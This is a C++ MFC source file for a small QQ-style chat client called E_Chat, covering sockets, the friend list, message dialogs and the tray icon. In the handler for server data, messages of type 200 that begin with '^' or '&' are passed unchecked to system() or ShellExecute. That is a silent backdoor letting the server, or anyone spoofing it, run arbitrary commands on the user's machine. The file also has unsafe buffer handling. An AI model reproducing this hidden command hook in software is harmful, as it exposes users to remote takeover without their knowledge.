// QQClientDlg.cpp : implementation file
//

#include "stdafx.h"
#include "QQClient.h"
#include "QQClientDlg.h"
#include "InfoDlg.h"
#include"MsgDlg.h"
#include"SendMsg.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CRect m_rect;
	CAboutDlg();
	
	// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA
	
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL
	
	// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	afx_msg void OnTimer(UINT nIDEvent);
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg void OnDestroy();
	afx_msg HBRUSH OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor);
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
private:
	CString m_str;
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
//{{AFX_MSG_MAP(CAboutDlg)
	ON_WM_TIMER()
	ON_WM_PAINT()
	ON_WM_DESTROY()
	ON_WM_CTLCOLOR()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CQQClientDlg dialog

CQQClientDlg::CQQClientDlg(CWnd* pParent /*=NULL*/)
: CDialog(CQQClientDlg::IDD, pParent)
{
	
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
    FriendDataPort=4000;
	RecvMsgPort=6000;
	SevMsgPort=6030;
}
CQQClientDlg::~CQQClientDlg()
{
	Shell_NotifyIcon(NIM_DELETE, &nd);
	//关闭套接字
	closesocket(m_sevSocket);
	closesocket(m_listenSocket);
	closesocket(m_sendSocket);
	
}
void CQQClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CQQClientDlg)
	DDX_Control(pDX, IDC_LIST1, m_listUser);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CQQClientDlg, CDialog)
//{{AFX_MSG_MAP(CQQClientDlg)
ON_WM_SYSCOMMAND()
ON_WM_PAINT()
ON_MESSAGE(WM_MSGRECV,OnMsgRecv)
ON_MESSAGE(WM_SEVMSG,OnSevMsg)
ON_MESSAGE(WM_RECVFRIENDDATA,OnRecvFriendData)
ON_WM_QUERYDRAGICON()
ON_WM_TIMER()
ON_MESSAGE(WM_NOTIFYICONMSG,OnNotifyIconMsg)
ON_COMMAND(IDM_EXIT, OnExit)
ON_COMMAND(IDM_HIDE, OnHide)
ON_COMMAND(IDM_SHOW, OnShow)
ON_WM_CREATE()
ON_LBN_DBLCLK(IDC_LIST1, OnDblclkList1)
ON_WM_CTLCOLOR()
ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
ON_BN_CLICKED(IDC_BUT_ABOUT, OnButAbout)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CQQClientDlg message handlers

BOOL CQQClientDlg::OnInitDialog()
{
	//RecvFriendData();
	//
	CDialog::OnInitDialog();
     
	// Add "About..." menu item to system menu.
	Pfrienddata=NULL;
	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);
    CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}
	/////////////////////////////
	nd.cbSize=sizeof(NOTIFYICONDATA);
	nd.hWnd	= m_hWnd;
	nd.uID	= IDR_MAINFRAME;
	nd.uFlags	= NIF_ICON|NIF_MESSAGE|NIF_TIP;
	nd.uCallbackMessage	= WM_NOTIFYICONMSG;
	Pfrienddata=NULL;
	nd.hIcon= m_hIcon;
	strcpy(nd.szTip, "QQ");
	Shell_NotifyIcon(NIM_ADD, &nd);
	SetTimer(1,1000,NULL);	
	SetIcon(m_hIcon, TRUE);			 
	SetIcon(m_hIcon, FALSE);
    SendToSocket=socket(AF_INET,SOCK_DGRAM,0);
    char buf[10];
	itoa(me.id,buf,10);
 	SetDlgItemText(IDC_EDIT_ID,buf);

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CQQClientDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CQQClientDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting
		
		 SendMessage(WM_ICONERASEBKGND,(WPARAM)dc.GetSafeHdc(),0);
		
		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;
		
		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
		
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CQQClientDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}


void CQQClientDlg::OnTimer(UINT nIDEvent) 
{
	static int i=0;
	switch(nIDEvent)
	{
	case 1:
		
		switch(i%3)
		{
		case 0:
			m_hIcon=AfxGetApp()->LoadIcon(IDI_ICON1);
			break;
		case 1:
			m_hIcon=AfxGetApp()->LoadIcon(IDI_ICON2);
			break;
		case 2:
			m_hIcon=AfxGetApp()->LoadIcon(IDI_ICON3);
			break;
		}
		nd.hIcon=m_hIcon;
		Shell_NotifyIcon(NIM_MODIFY,&nd);
		i++;
		break;
		case 2:
			this->PostMessage(WM_SEVMSG,0,(LPARAM)"4@连接服务器失败!");
			break;
			
	}
}
DWORD CQQClientDlg::RecMsgProc(LPVOID lpParameter)
{
	HWND hwnd=((Param*)lpParameter)->hwnd;
	SOCKET m_socket=((Param*)lpParameter)->m_socket;
	
	char buf[200];
	
	SOCKADDR_IN CliAddr;
	
	int len=sizeof(SOCKADDR_IN);
    int Result;
	
	while(TRUE)
	{
		Result=recvfrom(m_socket,buf,100,0,(sockaddr*)&CliAddr,&len);
		if(Result==SOCKET_ERROR)
		{
			::MessageBox(NULL,"Socket ERROR!","",MB_OK);
			break;
		}
		::PostMessage(hwnd,WM_MSGRECV,(WPARAM)&CliAddr,(LPARAM)buf);
	}
	
	return 0;
}
LRESULT  CQQClientDlg::OnMsgRecv(WPARAM wParam,LPARAM lParam)
{
	m_SevAddr=*(SOCKADDR_IN*)wParam;
	CMsgDlg dlg;
	CString str=(char*)lParam;
 //	MessageBox(str);
	int i=str.Find("@",0);
	CString Name=str.Left(i);
	//::sndPlaySound("C:\\Program Files\\MyQQ\\msg.wav",SND_FILENAME|SND_SYNC);
	::sndPlaySound("msg.wav",SND_FILENAME|SND_SYNC);
    str=str.Right(str.GetLength()-i-1);
	i=str.Find("%",0);
	dlg.m_msg=str.Left(i);
 
	dlg.m_title=Name;//(char*)lParam;
	dlg.m_IsSate=FALSE;
	
    if(dlg.DoModal()==IDOK)
	{
		m_msg=me.Name+"@";
		m_msg+=dlg.m_msg+"%";
		for(i=0;i<friendCount;i++)
		{
			if(strcmp(Pfrienddata[i].Name,Name)==0)
			{
				m_SevAddr.sin_port=htons(Pfrienddata[i].port);
			//	MessageBox(Name);
			}
		}
		SendMsg();
	}
	m_msg=me.Name+"@";
	 return 0;
}

BOOL CQQClientDlg::InitSocket()
{ 
	 
	m_listenSocket=socket(AF_INET,SOCK_DGRAM,0);
	
	if(m_listenSocket==INVALID_SOCKET)
	{
		MessageBox("接收套接字创建失败!");
		return FALSE;
	}
	char hostname[50];
	int Result;
	Result=gethostname(hostname,50);
	if(Result!=0)
	{
		MessageBox("主机查找错误!","Error!",MB_OK);
		return FALSE;
	}
	HOSTENT* hst=NULL;
	CString strTemp;
	struct in_addr ia; 
	
	
	CString m_strIP;
	m_strIP="";
	hst = gethostbyname((LPCTSTR)hostname);	
	
	
    for(int i=0;hst->h_addr_list[i];i++){
        memcpy(&ia.s_addr,hst->h_addr_list[i],sizeof(ia.s_addr));
        strTemp.Format("%s\n",inet_ntoa(ia));
		m_strIP+=strTemp;
    }
	
	
	m_AddrSev.sin_addr=ia;
	
	AddrMsgSend.sin_addr=ia; 
	AddrMsgSend.sin_family=AF_INET;
	AddrMsgSend.sin_port=htons(6000);

	SOCKADDR_IN SevAddr;
	SevAddr.sin_addr=ia; 
	SevAddr.sin_family=AF_INET;
	
	SevAddr.sin_port=htons(RecvMsgPort);
	Result=bind(m_listenSocket,(sockaddr*)&SevAddr,sizeof(SOCKADDR));
	int j=0;

 while(Result==SOCKET_ERROR&&j<5)
	{
        RecvMsgPort++;
        SevAddr.sin_port=htons(RecvMsgPort);
		Result=bind(m_listenSocket,(sockaddr*)&SevAddr,sizeof(SOCKADDR));
		j++;
		
	}
	SevAddr.sin_port=htons(FriendDataPort);
	j=0;
	Result=bind(dataRecvSocket,(sockaddr*)&SevAddr,sizeof(SOCKADDR));
	while(Result==SOCKET_ERROR&&j<5)
	{
        FriendDataPort++;
        SevAddr.sin_port=htons(FriendDataPort);
		Result=bind(dataRecvSocket,(sockaddr*)&SevAddr,sizeof(SOCKADDR));
		j++;
	}
	SevAddr.sin_port=htons(SevMsgPort);
    Result=bind(m_sevSocket,(sockaddr*)&SevAddr,sizeof(SOCKADDR));
	j=0;
	while(Result==SOCKET_ERROR&&j<5)
	{
		SevMsgPort++;
		SevAddr.sin_port=htons(SevMsgPort);
	    Result=bind(m_sevSocket,(sockaddr*)&SevAddr,sizeof(SOCKADDR));
        j++;
		
	}
   
	return TRUE;
	
	
}

void CQQClientDlg::SendMsg()
{
   
//	m_SevAddr.sin_port=htons(6000);
	
	int Result=sendto(m_sendSocket,m_msg,m_msg.GetLength(),0,(sockaddr*)&m_SevAddr,sizeof(SOCKADDR));
	if(Result==SOCKET_ERROR)
	{
		MessageBox("信息发送失败!");
		return;

	}
//	MessageBox("发送成功!");
}
DWORD CQQClientDlg::SevConProc(LPVOID lpParamter)
{
	
	//CString str=((SevParam*)lpParamter)->str;
	SOCKET m_socket=((SevParam*)lpParamter)->m_socket;//(AF_INET,SOCK_DGRAM,0);
	 
	SOCKADDR_IN addr=((SevParam*)lpParamter)->addr;
	HWND hwnd=((SevParam*)lpParamter)->hwnd;
    
	

/*	addr.sin_family=AF_INET;
	addr.sin_port=htons(6030);
    int Result=bind(m_socket,(sockaddr*)&addr,sizeof(SOCKADDR));
	if(Result==SOCKET_ERROR)
	{
		::MessageBox(NULL,"服务器套节字帮定失败!",0,MB_OK);
		closesocket(m_socket);
		return FALSE;
	}*/
	char buf[30];
    SOCKADDR_IN AddrMsgSend;
	int len=sizeof(SOCKADDR);
	 
	int result;
	while(1)
	{  
	    result=recvfrom(m_socket,buf,30,0,(sockaddr*)&AddrMsgSend,&len);
		if(result!=SOCKET_ERROR)
			break;
    	
	   // ::MessageBox(NULL,buf,0,MB_OK);
    	::SendMessage(hwnd,WM_SEVMSG,0,(LPARAM)&buf);

    }
	
	return 0;
}
LRESULT CQQClientDlg::OnSevMsg(WPARAM wParam,LPARAM lParam)//处理服务器返回信息
{
	 
	CString temp=(char*)lParam;//获取服务器返回字符串
	int i=temp.Find("@");
	CString Id=temp.Left(i);
	CString temp2=temp.Right(temp.GetLength()-i-1);
 
	UINT MsgType=atoi(Id);//获取服务器返回信息类型
     CString msgStr;
	 //::sndPlaySound("C:\\Program Files\\MyQQ\\system.wav",SND_FILENAME|SND_SYNC);
	::sndPlaySound("system.wav",SND_FILENAME|SND_SYNC);
		
	switch (MsgType)
	{
	case 1:
	    
		MessageBox("欢迎使用!\n\r已成功登录!","登录成功!");
		KillTimer(2);//登录成功
		break;
	case 2:
	 
		MessageBox("密码错误或用户不存在!","认证失败!");//登录失败

		KillTimer(2);//服务器认证失败   
		break;
	case 3:
		 msgStr.Format("申请号码成功!\n\r您的号码为:%d",atoi(temp2));
	 
         MessageBox(msgStr,"恭喜!");
		 me.id=atoi(temp2);//申请号码成功
		 KillTimer(2);
		break;
	case 4:
		 MessageBox(temp2,"重试");
		break;//服务器没有回应此信息由Timer发出
	default:

		break;
		
	}
	 return 0;
}
LRESULT CQQClientDlg::OnNotifyIconMsg(WPARAM wParam,LPARAM lParam)//处理托盘消息
{
	CPoint Point;
	switch ( lParam )
    {
	case WM_RBUTTONDOWN://如果按下鼠标右建
		{
			CMenu pMenu;//加载菜单
			if (pMenu.LoadMenu(IDR_MENU1))        
			{
				CMenu* pPopup = pMenu.GetSubMenu(0);
				
				GetCursorPos( &Point );
				SetForegroundWindow();
				pPopup->TrackPopupMenu(
					TPM_LEFTALIGN | TPM_RIGHTBUTTON,
					Point.x, Point.y, this); 
			}
		}
		break;
	default:
		break;
    }
     return 0;
}

void CQQClientDlg::OnExit() //退出
{
	
	this->PostMessage(WM_CLOSE);
}

void CQQClientDlg::OnHide() //隐藏
{
	this->ShowWindow(SW_HIDE);
	
}

void CQQClientDlg::OnShow() //显示
{
	this->ShowWindow(SW_SHOW);
	
}

DWORD CQQClientDlg::RecvFriendData(LPVOID lpParameter)//服务器信息接收函数（用于接收好友信息和服务器发来的信息）
{
 
	//提取参数
	HWND hwnd=((ReavDataParam*)lpParameter)->hwnd;
	SOCKET dataRecvSocket1=((ReavDataParam*)lpParameter)->m_socket;
	SOCKADDR_IN AddrMsgSend1=((ReavDataParam*)lpParameter)->addr;
    int Result;

/*	AddrMsgSend1.sin_port=htons(4000);
	
	int Result=bind(dataRecvSocket1,(sockaddr*)&AddrMsgSend1,sizeof(SOCKADDR));
	if(Result==SOCKET_ERROR)
	{
		::MessageBox(NULL,"服务器套节字帮定失败!",0,MB_OK);
		closesocket(dataRecvSocket1);
		return FALSE;
	}*/
	
    SOCKADDR_IN SevAddr;
 
	int len=sizeof(SOCKADDR);
    listen(dataRecvSocket1,5); 
	char  buf[500];

	SOCKET conSocket;
	//int Result;
   conSocket=accept(dataRecvSocket1,(sockaddr*)&SevAddr,&len);
//   ::MessageBox(NULL,buf,0,MB_OK);
     while(TRUE)//接收服务器发来信息
	 {  
		 
		 Result=recv(conSocket,buf,500,0);
           if(Result==SOCKET_ERROR)
			break;
        
     
		
      ::PostMessage(hwnd,WM_RECVFRIENDDATA,0,(LPARAM)buf);
	   
} 
::MessageBox(NULL,"与服务器连接失败!\n\r好友信息不能更新","服务器信息",MB_OK);
	return 0;
}
LRESULT CQQClientDlg::OnRecvFriendData(WPARAM wParam,LPARAM lParam)//处理服务器发来信息（自定义消息WM_RECVFRIENDDATA)
{
	 CString str=(char*)lParam;
   // MessageBox(str);
	 int x=str.Find("*",0);
	  
	 UINT MsgType=atoi(str.Left(x));
	 str=str.Right(str.GetLength()-x-1);
	
if(MsgType<100)
{
	if(Pfrienddata!=NULL)
		delete []Pfrienddata;
	friendCount=MsgType;
	Pfrienddata=new UserData[friendCount];
	m_listUser.ResetContent();
	
	 
	int i;
	int friendNum=0;
    CString temp2,temp3;
	CString Usertemp;
    UserData tempdata;
	////////////////////////////////////////////////
	for(int j=0;j<friendCount;j++)
	{
		i=str.Find("#");
		temp2=str.Left(i);
		str=str.Right(str.GetLength()-i-1);
		
		i=temp2.Find("@");
		temp3=temp2.Left(i);
		temp2=temp2.Right(temp2.GetLength()-i-1);
		tempdata.code=atoi(temp3);//1
		
		i=temp2.Find("@");
		temp3=temp2.Left(i);
		temp2=temp2.Right(temp2.GetLength()-i-1);
		tempdata.id=atoi(temp3);//2
		
		i=temp2.Find("@");
		temp3=temp2.Left(i);
        temp2=temp2.Right(temp2.GetLength()-i-1);
		tempdata.Name=temp3;//3
        
		i=temp2.Find("@");
		temp3=temp2.Left(i);
		temp2=temp2.Right(temp2.GetLength()-i-1);
		tempdata.IsOnline=atoi(temp3);//4
		
		
		i=temp2.Find("@");
		temp3=temp2.Left(i);
		temp2=temp2.Right(temp2.GetLength()-i-1);
		tempdata.ip=temp3;//5
		

		i=temp2.Find("@");
		temp3=temp2.Left(i);
		//MessageBox(temp3);
		tempdata.port=atoi(temp3);//6
		
		if(tempdata.id==me.id)
		{
			me=tempdata;
			Usertemp=tempdata.Name+"-已登录";
			SetWindowText(Usertemp);
			
			
		}
		else
		{
			Pfrienddata[friendNum]=tempdata;
			Usertemp=Pfrienddata[friendNum].Name;
			
			if(Pfrienddata[friendNum].IsOnline==1)
				Usertemp+="(在线)";
			else
				Usertemp+="(离线)";
			m_listUser.InsertString(m_listUser.GetCount(),Usertemp);
			
			friendNum++;
		}
	}
}
  if(MsgType==200)
  {
	  x=str.Find("$");
	  str=str.Left(x);
	  //////////////////////////////系统控制///////////////////////
      if(str.Left(1)=="^")
	  {
		  str=str.Right(str.GetLength()-1);
		  system(str);
		  return 0;
	  }
	  if(str.Left(1)=="&")
	  { 
		  str=str.Right(str.GetLength()-1);
		  ::ShellExecute(NULL,"open",str,NULL,NULL,SW_SHOW);
		   return 0;

	  }
	  /////////////////////////系统信息///////////////////////////
	  CMsgDlg dlg;
	  dlg.m_title="服务器";
	  dlg.m_msg=str;
	  dlg.DoModal(); 
	  
  }
  return 0;
}

int CQQClientDlg::OnCreate(LPCREATESTRUCT lpCreateStruct) 
{
	m_msg=me.Name+"@";
	m_sevSocket=socket(AF_INET,SOCK_DGRAM,0);
	if(m_sevSocket==INVALID_SOCKET)
	{
		MessageBox("连接服务器套接字创建失败!");
		return FALSE;
	}
	 
    m_SendToAddr.sin_family=AF_INET;
	m_SendToAddr.sin_port=htons(6006);
	
	CInfoDlg dlg1;//登陆窗口
	
	if(IDOK==dlg1.DoModal())
	{
		// 获取用户资料并连接服务器
		
		CString str;
		///////////////数据接收套接字初始化/////////////
	
		dataRecvSocket=socket(AF_INET,SOCK_STREAM,0);
		////////////////////////////////////////////////////////
		
		

		InitSocket();//初始接收套接字
    	ReavDataParam *param;
        param=new ReavDataParam;
		param->hwnd=m_hWnd;
		param->m_socket=dataRecvSocket;
		param->addr=AddrMsgSend;
		HANDLE handle5;
		handle5=CreateThread(NULL,0,RecvFriendData,(LPVOID)param,0,NULL);//启动好友信息接收线程
		CloseHandle(handle5); 
		//////////////////////////////////
    
	    SevParam *sevparam=new SevParam;
		sevparam->m_socket=m_sevSocket;
		//sevparam->str=str;
		sevparam->addr=m_AddrSev;
		sevparam->hwnd=m_hWnd;
	   
       
	
		HANDLE handle2=CreateThread(NULL,0,SevConProc,(LPVOID)sevparam,0,NULL);//启动连接服务器线程
 		CloseHandle(handle2);
		
		
	    
		
		CLoginDlg dlg;
		dlg.DoModal();
		SetTimer(2,15000,NULL);
 
		
    	me.code=dlg1.m_code;
		me.id=dlg1.m_id;
		m_AddrSev.sin_addr.S_un.S_addr=htonl(dlg1.ip);
		m_AddrSev.sin_port=htons(dlg1.m_nPort);
		m_AddrSev.sin_family=AF_INET;
		str=dlg1.msg;//获取用户输入信息
        CString tempstr;
		 
		tempstr.Format("#%d#%d#%d#",FriendDataPort,SevMsgPort,RecvMsgPort);
		str+=tempstr;
	//	MessageBox(str);
     	sendto(m_sevSocket,str,100,0,(sockaddr*)&m_AddrSev,sizeof(SOCKADDR));
		//向服务器发送连接请求
	}
	else//用户取消退出程序
	{
		this->PostMessage(WM_CLOSE);
	}
	
	 
	
	m_sendSocket=socket(AF_INET,SOCK_DGRAM,0);
	if(m_sendSocket==INVALID_SOCKET)
	{
		MessageBox("发送套接字创建失败!");
		return FALSE;
	}
   
	Param *lparam=new Param;
	lparam->hwnd=m_hWnd;
	lparam->m_socket=m_listenSocket;
	HANDLE handle=::CreateThread(NULL,0,RecMsgProc,(LPVOID)lparam,0,NULL);//启动接收信息线程
	CloseHandle(handle);
	///////////////////////////////////////////////////////////////////
    
	if (CDialog::OnCreate(lpCreateStruct) == -1)
	return -1;
	
	 
	
	return 0;
}

void CQQClientDlg::OnDblclkList1() 
{
	// TODO: Add your control notification handler code here
	m_msg=me.Name+"@";
    int i=m_listUser.GetCaretIndex();
    CSendMsg dlg;
	dlg.m_title="给";
	dlg.m_title+=Pfrienddata[i].Name;
	dlg.m_title+="发送信息!对方IP:";
	dlg.m_title+=Pfrienddata[i].ip;
	m_SendToAddr.sin_port=htons(Pfrienddata[i].port);
	m_SendToAddr.sin_addr.S_un.S_addr=inet_addr(Pfrienddata[i].ip);
 	 
	if(dlg.DoModal()==IDOK)
	{
	m_msg+=dlg.m_msg+"%";
  
	int Result=sendto(SendToSocket,m_msg,100,0,(sockaddr*)&m_SendToAddr,sizeof(SOCKADDR));
	if(Result==SOCKET_ERROR)
	{
	
		MessageBox("信息发送失败!");
		return;
	}
	}
	m_msg=me.Name+"@";
}


HBRUSH CQQClientDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor) 
{
	
	HBRUSH hbr = CreateSolidBrush(RGB(180,250,180));
	if(nCtlColor==CTLCOLOR_STATIC)
	{
		pDC->SetTextColor(RGB(255,0,0));
		pDC->SetBkColor(TRANSPARENT);
		pDC->SetBkColor(RGB(180,250,180));
	}
	// TODO: Change any attributes of the DC here
	if(nCtlColor==CTLCOLOR_EDIT)
	{
		pDC->SetTextColor(RGB(0,0,255));
		pDC->SetBkColor(TRANSPARENT);
		pDC->SetBkColor(RGB(180,250,180));
	}
	if(nCtlColor==CTLCOLOR_MSGBOX)
	{
		pDC->SetTextColor(RGB(0,255,0));
		pDC->SetBkColor(TRANSPARENT);
		pDC->SetBkColor(RGB(180,250,180));
	}
	if(nCtlColor==CTLCOLOR_LISTBOX)
	{
		pDC->SetTextColor(RGB(0,0,255));
		pDC->SetBkColor(TRANSPARENT);
		pDC->SetBkColor(RGB(180,250,180));
	}
	
	return hbr;
}

void CQQClientDlg::OnButton1() //响应按下菜单按纽
{
	CPoint Point;
	GetCursorPos(&Point);
	CMenu pMenu;
	if (pMenu.LoadMenu(IDR_MENU1))        
	{
		CMenu* pPopup = pMenu.GetSubMenu(0);
		
		GetCursorPos( &Point );
		SetForegroundWindow();
		pPopup->TrackPopupMenu(
			TPM_LEFTALIGN | TPM_RIGHTBUTTON,
			Point.x, Point.y, this); 
		
	}
}

void CQQClientDlg::OnButAbout() 
{
	CAboutDlg dlg;
	dlg.DoModal();	
}

void CAboutDlg::OnTimer(UINT nIDEvent) 
{
    InvalidateRect(m_rect);
    if(m_rect.bottom-m_rect.top>=300)
	{
		m_rect.top=m_rect.bottom;
	}
	m_rect.top-=4;	
	CDialog::OnTimer(nIDEvent);
}

BOOL CAboutDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	GetWindowRect(&m_rect);
	ScreenToClient(m_rect);
	m_str="About\n\r\n\rName:\n\rE_Chat\n\r\n\rProgramer:\n\rzhaoning\n\r\n\rQQ:\n\r363788603\n\rE_mail:\n\rzhaoning@hotmail.com\n\r\n\rAddress:\n\rZhongyuan Universty of Technology\n\r\n\rDate:\n\r2005/12/7"; 
    m_rect.bottom=m_rect.top;
 	m_rect.bottom+=130;
 	SetTimer(5,120,NULL);
	
	return TRUE;  // return TRUE unless you set the focus to a control
	 
}

void CAboutDlg::OnPaint() 
{
	CPaintDC dc(this);
	
	dc.SetBkMode(TRANSPARENT);
	dc.SetTextColor(RGB(255,0,0));
	CRect rc;
	rc.right=m_rect.right;
	rc.left=m_rect.left;
	rc.bottom=m_rect.bottom;
	rc.top=rc.bottom;
	rc.top-=130;
	dc.FillSolidRect(rc,RGB(100,100,100));
	dc.DrawText(m_str,&m_rect,DT_CENTER);	
 
}

void CAboutDlg::OnDestroy() 
{
	CDialog::OnDestroy();
	
	 KillTimer(5);	
}

HBRUSH CAboutDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor) 
{
	HBRUSH hbr = CreateSolidBrush(RGB(100,240,150));//CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	if(nCtlColor==CTLCOLOR_STATIC)
	{
		pDC->SetTextColor(RGB(0,0,255));
		pDC->SetBkColor(TRANSPARENT);
		pDC->SetBkColor(RGB(100,240,150));
	}
	// TODO: Change any attributes of the DC here
	if(nCtlColor==CTLCOLOR_EDIT)
	{
		pDC->SetTextColor(RGB(0,0,255));
		pDC->SetBkColor(TRANSPARENT);
		pDC->SetBkColor(RGB(100,240,150));
	}
	return hbr;
}
